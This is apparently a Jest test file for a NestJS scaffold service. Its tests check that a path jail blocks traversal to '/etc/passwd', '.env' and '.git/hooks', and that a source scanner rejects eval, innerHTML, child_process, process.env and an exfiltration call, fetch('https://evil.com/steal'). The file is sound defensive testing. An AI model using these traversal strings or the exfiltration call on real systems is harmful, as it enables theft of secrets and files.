import { ForbiddenException } from '@nestjs/common';
import { ScaffoldService } from './scaffold.service';

// ── Mocks ────────────────────────────────────────────────────────────────

const mockConfig = {
  get: (key: string, fallback: string) => {
    const values: Record<string, string> = {
      GAMMA_OS_REPO: '/tmp/test-gamma-os',
      SCAFFOLD_GIT_BRANCH: 'private-apps',
      SCAFFOLD_AUTO_PUSH: 'false',
      SCAFFOLD_PRIVATE_REPO_URL: '',
      GIT_AUTHOR_NAME: 'test-user',
      GIT_AUTHOR_EMAIL: 'test@test.com',
    };
    return values[key] ?? fallback;
  },
};

const mockRedis = {
  hset: jest.fn().mockResolvedValue(1),
  hdel: jest.fn().mockResolvedValue(1),
  xadd: jest.fn().mockResolvedValue('1-0'),
};

describe('ScaffoldService', () => {
  let service: ScaffoldService;

  beforeEach(() => {
    service = new ScaffoldService(mockConfig as any, mockRedis as any);
    jest.clearAllMocks();
  });

  // ── Path Jail Tests ──────────────────────────────────────────────────

  describe('jailPath', () => {
    it('should resolve a valid relative path', () => {
      const result = service.jailPath('WeatherApp.tsx');
      expect(result).toBe(
        '/tmp/test-gamma-os/web/apps/generated/WeatherApp.tsx',
      );
    });

    it('should resolve nested paths', () => {
      const result = service.jailPath('assets/weather/icon.png');
      expect(result).toBe(
        '/tmp/test-gamma-os/web/apps/generated/assets/weather/icon.png',
      );
    });

    it('should block traversal with ../..', () => {
      expect(() => service.jailPath('../../src/main.tsx')).toThrow(
        ForbiddenException,
      );
    });

    it('should block traversal to /etc/passwd', () => {
      expect(() => service.jailPath('../../../etc/passwd')).toThrow(
        ForbiddenException,
      );
    });

    it('should block absolute paths', () => {
      expect(() => service.jailPath('/etc/passwd')).toThrow(
        ForbiddenException,
      );
    });

    it('should block traversal to .env', () => {
      expect(() => service.jailPath('../../../.env')).toThrow(
        ForbiddenException,
      );
    });

    it('should block .git/config', () => {
      expect(() => service.jailPath('.git/config')).toThrow(
        ForbiddenException,
      );
    });

    it('should block .git/hooks/pre-commit', () => {
      expect(() => service.jailPath('.git/hooks/pre-commit')).toThrow(
        ForbiddenException,
      );
    });

    it('should block .env files', () => {
      expect(() => service.jailPath('.env')).toThrow(ForbiddenException);
    });

    it('should block .DS_Store', () => {
      expect(() => service.jailPath('.DS_Store')).toThrow(ForbiddenException);
    });

    it('should block nested hidden dirs like assets/.hidden/file', () => {
      expect(() => service.jailPath('assets/.hidden/file.txt')).toThrow(
        ForbiddenException,
      );
    });

    it('should block the "." path (hidden segment)', () => {
      expect(() => service.jailPath('.')).toThrow(ForbiddenException);
    });
  });

  // ── Security Scanner Tests ───────────────────────────────────────────

  describe('validateSource', () => {
    const validComponent = `
      import React from 'react';
      export const WeatherApp: React.FC = () => {
        return <div>Weather</div>;
      };
    `;

    it('should accept a valid React component', () => {
      const result = service.validateSource(validComponent);
      expect(result.ok).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject eval()', () => {
      const code = `import React from 'react';\nexport const X = () => { eval('alert(1)'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('eval()');
    });

    it('should reject innerHTML', () => {
      const code = `import React from 'react';\nexport const X = () => { document.body.innerHTML = '<script>'; return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('innerHTML');
    });

    it('should reject document.write', () => {
      const code = `import React from 'react';\nexport const X = () => { document.write('hack'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('document.write');
    });

    it('should reject localStorage', () => {
      const code = `import React from 'react';\nexport const X = () => { localStorage.setItem('x','y'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('localStorage');
    });

    it('should reject sessionStorage', () => {
      const code = `import React from 'react';\nexport const X = () => { sessionStorage.getItem('x'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('sessionStorage');
    });

    it('should reject child_process require', () => {
      const code = `import React from 'react';\nconst cp = require('child_process');\nexport const X = () => <div/>;`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('child_process');
    });

    it('should reject process.env', () => {
      const code = `import React from 'react';\nexport const X = () => <div>{process.env.SECRET}</div>;`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('process.env');
    });

    it('should reject external fetch', () => {
      const code = `import React from 'react';\nexport const X = () => { fetch('https://evil.com/steal'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('External fetch');
    });

    it('should allow fetch to localhost', () => {
      const code = `import React from 'react';\nexport const X = () => { fetch('http://localhost:3001/api'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(true);
    });

    it('should reject code without export', () => {
      const code = `import React from 'react';\nconst X = () => <div/>;`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('export');
    });

    it('should reject code without React reference', () => {
      const code = `export const X = () => {};`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('react');
    });

    it('should catch multiple violations at once', () => {
      const code = `eval('x'); document.write('y');`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors.length).toBeGreaterThanOrEqual(2);
    });
  });
});
